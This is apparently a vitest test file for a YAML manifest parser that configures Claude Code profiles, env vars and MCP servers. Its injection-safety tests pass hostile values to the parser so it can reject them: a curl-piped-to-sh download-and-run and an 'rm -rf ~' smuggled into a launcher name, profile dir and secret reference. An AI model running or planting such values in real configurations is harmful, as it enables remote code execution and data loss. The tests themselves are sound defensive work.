import { describe, it, expect } from 'vitest'
import { mkdtemp } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { parseManifest, serializeManifest, loadManifest, saveManifest, ManifestError } from '../src/manifest.js'

const sample = {
  version: 1 as const,
  hub: 'default',
  profiles: [{
    name: 'oauth', dir: '{home}/.claude-oauth', launcher: 'cl-auth',
    auth: 'oauth' as const, env: {}, links: { skills: 'hub', commands: 'hub' }, mcp: ['playwright'], settingsEnv: {}, skipPermissions: false,
  }],
  mcpServers: { playwright: { command: 'npx', args: ['-y', '@playwright/mcp@latest'] } },
}

describe('manifest', () => {
  it('round-trips through yaml', () => {
    expect(parseManifest(serializeManifest(sample))).toEqual(sample)
  })
  it('rejects unknown version', () => {
    expect(() => parseManifest('version: 2\nhub: null\nprofiles: []\nmcpServers: {}')).toThrow(ManifestError)
  })
  it('rejects profile referencing undefined mcp server', () => {
    const bad = { ...sample, mcpServers: {} }
    expect(() => parseManifest(serializeManifest(bad))).toThrow(/undefined mcp server/i)
  })
  it('loads and saves from a root dir', async () => {
    const root = await mkdtemp(join(tmpdir(), 'ccp-'))
    await saveManifest(root, sample)
    expect(await loadManifest(root)).toEqual(sample)
  })

  describe('injection safety (untrusted manifests)', () => {
    const withProfile = (patch: Record<string, unknown>) => serializeManifest({
      ...sample,
      profiles: [{ ...sample.profiles[0], ...patch }],
    } as any)

    it('rejects a launcher name with shell metacharacters', () => {
      expect(() => parseManifest(withProfile({ launcher: 'x; curl evil|sh' }))).toThrow(/unsafe launcher/)
    })
    it('rejects a profile dir that could break the quoted context', () => {
      expect(() => parseManifest(withProfile({ dir: '{home}/.claude"; rm -rf ~ #' }))).toThrow(/unsafe profile dir/)
    })
    it('rejects an env var name that is not a valid identifier', () => {
      expect(() => parseManifest(withProfile({ env: { 'X; evil': 'v' } }))).toThrow(/unsafe env var/)
    })
    it('rejects a secret reference with injection characters', () => {
      expect(() => parseManifest(withProfile({ env: { TOKEN: 'secret://a); curl evil|sh #' } }))).toThrow(/unsafe secret reference/)
    })
    it('accepts a normal profile', () => {
      expect(() => parseManifest(withProfile({ launcher: 'cl-work', env: { TOKEN: 'secret://z-token' } }))).not.toThrow()
    })
  })

  describe('settingsEnv', () => {
    const base = (settingsEnv: string) => `
version: 1
hub: null
profiles:
  - name: z
    dir: "{home}/.claude-z"
    launcher: cl-z
    auth: env
    env: {}
    links: {}
    mcp: []
${settingsEnv}
mcpServers: {}
`
    it('parses settingsEnv and defaults to {}', () => {
      const m = parseManifest(base(`    settingsEnv:\n      ANTHROPIC_BASE_URL: "https://api.z.ai/api/anthropic"\n      API_TIMEOUT_MS: "3000000"`))
      expect(m.profiles[0].settingsEnv.ANTHROPIC_BASE_URL).toBe('https://api.z.ai/api/anthropic')
      const m2 = parseManifest(base(''))
      expect(m2.profiles[0].settingsEnv).toEqual({})
    })
    it('rejects unsafe settingsEnv key', () => {
      expect(() => parseManifest(base(`    settingsEnv:\n      "BAD KEY": "x"`))).toThrow(/unsafe settings env var name/)
    })
    it('rejects empty or unsafe secret ref in settingsEnv', () => {
      expect(() => parseManifest(base(`    settingsEnv:\n      ANTHROPIC_AUTH_TOKEN: "secret://"`))).toThrow(/unsafe secret reference/)
    })
    it('allows freeform values (urls, dollars) in settingsEnv', () => {
      const m = parseManifest(base(`    settingsEnv:\n      FOO: "has $dollar and \\"quotes\\" and ; semicolons"`))
      expect(m.profiles[0].settingsEnv.FOO).toContain('$dollar')
    })
  })

  describe('remote mcp servers', () => {
    const withServers = (servers: string) => `
version: 1
hub: null
profiles: []
mcpServers:
${servers}
`
    it('accepts a remote server with url and no command', () => {
      const m = parseManifest(withServers(`  clickup:\n    type: http\n    url: "https://mcp.clickup.com/x"`))
      expect(m.mcpServers.clickup.url).toBe('https://mcp.clickup.com/x')
      expect(m.mcpServers.clickup.command).toBeUndefined()
    })
    it('still accepts a local server with command', () => {
      const m = parseManifest(withServers(`  fs:\n    command: npx\n    args: ["-y", "server-fs"]`))
      expect(m.mcpServers.fs.command).toBe('npx')
    })
    it('rejects a server with neither command nor url', () => {
      expect(() => parseManifest(withServers(`  bad:\n    type: http`))).toThrow(/either "command".*or "url"/)
    })

    it('saveManifest round-trips a remote-server manifest', async () => {
      const root = await mkdtemp(join(tmpdir(), 'ccp-savemcp-'))
      const m = parseManifest(withServers(`  clickup:\n    type: http\n    url: "https://mcp.clickup.com/x"`))
      await saveManifest(root, m)
      const reloaded = await loadManifest(root)
      expect(reloaded.mcpServers.clickup.url).toBe('https://mcp.clickup.com/x')
    })
  })

  it('skipPermissions parses and defaults to false', () => {
    const withFlag = parseManifest(`
version: 1
hub: null
profiles:
  - name: z
    dir: "{home}/.claude-z"
    launcher: cl-z
    auth: env
    env: {}
    links: {}
    mcp: []
    skipPermissions: true
mcpServers: {}
`)
    expect(withFlag.profiles[0].skipPermissions).toBe(true)
    const noFlag = parseManifest(`
version: 1
hub: null
profiles:
  - name: z
    dir: "{home}/.claude-z"
    launcher: cl-z
    auth: env
    env: {}
    links: {}
    mcp: []
mcpServers: {}
`)
    expect(noFlag.profiles[0].skipPermissions).toBe(false)
  })
})
